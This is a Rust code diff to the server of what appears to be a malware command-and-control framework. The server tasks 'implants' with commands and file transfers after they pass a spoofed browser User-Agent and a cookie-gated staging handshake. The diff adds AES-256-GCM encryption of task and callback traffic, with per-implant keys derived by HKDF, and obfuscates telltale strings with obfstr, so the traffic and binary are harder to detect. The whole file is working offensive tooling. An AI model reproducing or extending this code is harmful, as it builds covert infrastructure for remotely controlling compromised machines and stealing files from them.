@@ -7,12 +7,68 @@ use std::sync::{Arc, Mutex};
 use uuid::Uuid;
 
 use crate::links::{Links, NewLink};
+use obfstr::obfstr;
 
 /// User-Agent that all implants must present.
 const IMPLANT_UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
 
 pub struct AppState {
     pub links: Arc<Mutex<Links>>,
+}
+
+/// Derive a 32-byte key using HKDF-SHA256
+fn derive_key(secret: &[u8], salt: &str) -> [u8; 32] {
+    use hkdf::Hkdf;
+    use sha2::Sha256;
+
+    let salt = salt.as_bytes();
+    let ikm = secret;
+    let info = []; // No info
+
+    let hk = Hkdf::<Sha256>::new(Some(salt), ikm);
+    let mut okm = [0u8; 32];
+    hk.expand(&info, &mut okm).expect("HKDF expansion failed");
+    okm
+}
+
+/// Encrypt payload data using AES-256-GCM
+fn encrypt_payload(data: &str, key: &[u8; 32]) -> String {
+    use aes_gcm::{
+        aead::{Aead, KeyInit},
+        Aes256Gcm, Nonce,
+    };
+
+    let nonce_bytes = rand::random::<[u8; 12]>();
+    let nonce = Nonce::from_slice(&nonce_bytes);
+    let cipher = Aes256Gcm::new_from_slice(key).expect("Failed to create cipher");
+    let ciphertext = cipher
+        .encrypt(nonce, data.as_bytes())
+        .expect("Encryption failure");
+
+    let mut result = Vec::with_capacity(nonce.len() + ciphertext.len());
+    result.extend_from_slice(nonce);
+    result.extend_from_slice(&ciphertext);
+    hex::encode(result)
+}
+
+/// Decrypt payload data using AES-256-GCM
+fn decrypt_payload(encrypted_hex: &str, key: &[u8; 32]) -> Option<String> {
+    use aes_gcm::{
+        aead::{Aead, KeyInit},
+        Aes256Gcm, Nonce,
+    };
+
+    let encrypted_data = hex::decode(encrypted_hex).ok()?;
+    if encrypted_data.len() < 12 {
+        return None;
+    }
+    let nonce = Nonce::from_slice(&encrypted_data[..12]);
+    let ciphertext = &encrypted_data[12..];
+    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
+    match cipher.decrypt(nonce, ciphertext) {
+        Ok(decrypted) => String::from_utf8(decrypted).ok(),
+        Err(_) => None,
+    }
 }
 
 // ── Request/Response types ──────────────────────────────────────────────────
@@ -30,30 +86,40 @@ pub struct RegisterRequest {
 
 #[derive(Deserialize)]
 pub struct CallbackRequest {
-    /// Output of the previously executed task (empty on first poll).
+    /// Hex-encoded encrypted payload (nonce || ciphertext)
+    #[serde(default)]
+    pub data: Option<String>,
+    /// For backward compatibility during transition
+    #[serde(default)]
     pub q: String,
-    /// ID of the completed task (empty if none).
+    /// For backward compatibility during transition
+    #[serde(default)]
     pub tasking: String,
 }
 
 #[derive(Serialize)]
 struct TaskResponse {
-    /// Command to execute (empty when idle).
-    q: String,
-    /// Task ID to track (empty when idle).
-    tasking: String,
+    /// Hex-encoded encrypted payload (nonce || ciphertext)
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub data: Option<String>,
     /// Rolling request ID; implant must echo this on the next call.
     x_request_id: String,
-    /// For file download tasks, contains base64 encoded file content
+    /// For backward compatibility during transition
+    #[serde(default)]
+    q: String,
+    /// For backward compatibility during transition
+    #[serde(default)]
+    tasking: String,
+    /// For backward compatibility during transition
     #[serde(skip_serializing_if = "Option::is_none")]
     file: Option<String>,
-    /// For file download tasks, contains the original file name
+    /// For backward compatibility during transition
     #[serde(skip_serializing_if = "Option::is_none")]
     filename: Option<String>,
-    /// For file upload tasks, contains base64 encoded file content to upload
+    /// For backward compatibility during transition
     #[serde(skip_serializing_if = "Option::is_none")]
     upload: Option<String>,
-    /// For file upload tasks, contains the destination path
+    /// For backward compatibility during transition
     #[serde(skip_serializing_if = "Option::is_none")]
     upload_path: Option<String>,
 }
@@ -71,7 +137,7 @@ fn cookie_ok(req: &HttpRequest) -> bool {
     req.headers()
         .get("Cookie")
         .and_then(|v| v.to_str().ok())
-        .is_some_and(|c| c.contains("banner=banner"))
+        .is_some_and(|c| c.contains(obfstr!("banner=banner")))
 }
 
 fn parse_file_response(response: &str) -> Option<(String, String)> {
@@ -138,7 +204,7 @@ pub async fn stage1_handler(req: HttpRequest) -> impl Responder {
         return HttpResponse::NotFound().finish();
     }
     HttpResponse::Ok()
-        .insert_header(("Set-Cookie", "banner=banner; Path=/"))
+        .insert_header(("Set-Cookie", obfstr!("banner=banner; Path=/")))
         .body("")
 }
 
@@ -182,9 +248,10 @@ pub async fn stage2_handler(
     });
 
     let resp = TaskResponse {
+        data: None,
+        x_request_id: link.x_request_id.to_string(),
         q: String::new(),
         tasking: String::new(),
-        x_request_id: link.x_request_id.to_string(),
         file: None,
         filename: None,
         upload: None,
@@ -233,22 +300,55 @@ pub async fn stage3_handler(
         return HttpResponse::BadRequest().finish();
     };
 
-    // ── Lock 1: resolve link_id ──────────────────────────────────────────────
-    let link_id = {
+    // ── Lock 1: resolve link_id and get secret ────────────────────────────
+    let link_data = {
         let links = data.links.lock().unwrap_or_else(|e| e.into_inner());
-        links.find_by_request_id(x_req_id).map(|l| l.id)
+        links
+            .find_by_request_id(x_req_id)
+            .map(|l| (l.id, l.secret.clone()))
     };
-    let Some(link_id) = link_id else {
+    let Some((link_id, secret)) = link_data else {
         return HttpResponse::NotFound().finish();
     };
+    let key = derive_key(secret.as_bytes(), obfstr!("callback-salt"));
 
     // ── Lock 2 (conditional): process callback output ────────────────────────
     // Collect info needed for UI printing; the lock is released before any I/O.
     let ui_message: Option<(String, String, String)>; // (link_name, cli_cmd, display_output)
 
-    if !body.tasking.is_empty() {
-        if let Ok(task_id) = Uuid::parse_str(&body.tasking) {
-            if !body.q.is_empty() {
+    // Decrypt payload if present (new format), otherwise use legacy fields
+    let decrypted_q: String;
+    let decrypted_tasking: String;
+
+    if let Some(encrypted_data) = &body.data {
+        // New encrypted format
+        if let Some(decrypted) = decrypt_payload(encrypted_data, &key) {
+            // Parse the decrypted JSON payload
+            #[derive(Deserialize)]
+            struct PayloadData {
+                q: String,
+                tasking: String,
+            }
+            if let Ok(payload) = serde_json::from_str::<PayloadData>(&decrypted) {
+                decrypted_q = payload.q;
+                decrypted_tasking = payload.tasking;
+            } else {
+                decrypted_q = String::new();
+                decrypted_tasking = String::new();
+            }
+        } else {
+            decrypted_q = String::new();
+            decrypted_tasking = String::new();
+        }
+    } else {
+        // Legacy format (backward compatibility)
+        decrypted_q = body.q.clone();
+        decrypted_tasking = body.tasking.clone();
+    }
+
+    if !decrypted_tasking.is_empty() {
+        if let Ok(task_id) = Uuid::parse_str(&decrypted_tasking) {
+            if !decrypted_q.is_empty() {
                 let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
 
                 let (link_name, cli_cmd) = links
@@ -266,9 +366,9 @@ pub async fn stage3_handler(
 
                 let is_download = cli_cmd.starts_with("download ");
 
-                if is_download && body.q.starts_with("FILE:") {
+                if is_download && decrypted_q.starts_with("FILE:") {
                     // Save the file to disk; store path in task output.
-                    if let Some((file_path, file_content)) = parse_file_response(&body.q) {
+                    if let Some((file_path, file_content)) = parse_file_response(&decrypted_q) {
                         let display_msg = match save_download(&link_name, &file_path, &file_content)
                         {
                             Ok(dest) => {
@@ -290,10 +390,10 @@ pub async fn stage3_handler(
                         ui_message = None;
                     }
                 } else {
-                    ui_message = Some((link_name, cli_cmd, body.q.clone()));
+                    ui_message = Some((link_name, cli_cmd, decrypted_q.clone()));
                 }
 
-                links.complete_task(link_id, task_id, body.q.clone());
+                links.complete_task(link_id, task_id, decrypted_q.clone());
             } else {
                 ui_message = None;
             }
@@ -343,14 +443,38 @@ pub async fn stage3_handler(
             .unwrap_or_default()
     };
 
-    let resp = TaskResponse {
+    // Build response payload
+    #[derive(Serialize)]
+    struct ResponsePayload {
+        q: String,
+        tasking: String,
+        file: Option<String>,
+        filename: Option<String>,
+        upload: Option<String>,
+        upload_path: Option<String>,
+    }
+
+    let payload = ResponsePayload {
         q,
         tasking,
-        x_request_id: new_x_req_id.to_string(),
         file,
         filename,
         upload,
         upload_path,
+    };
+
+    let payload_json = serde_json::to_string(&payload).unwrap_or_else(|_| "{}".to_string());
+    let encrypted_data = encrypt_payload(&payload_json, &key);
+
+    let resp = TaskResponse {
+        data: Some(encrypted_data),
+        x_request_id: new_x_req_id.to_string(),
+        q: String::new(),
+        tasking: String::new(),
+        file: None,
+        filename: None,
+        upload: None,
+        upload_path: None,
     };
 
     HttpResponse::Ok().json(resp)
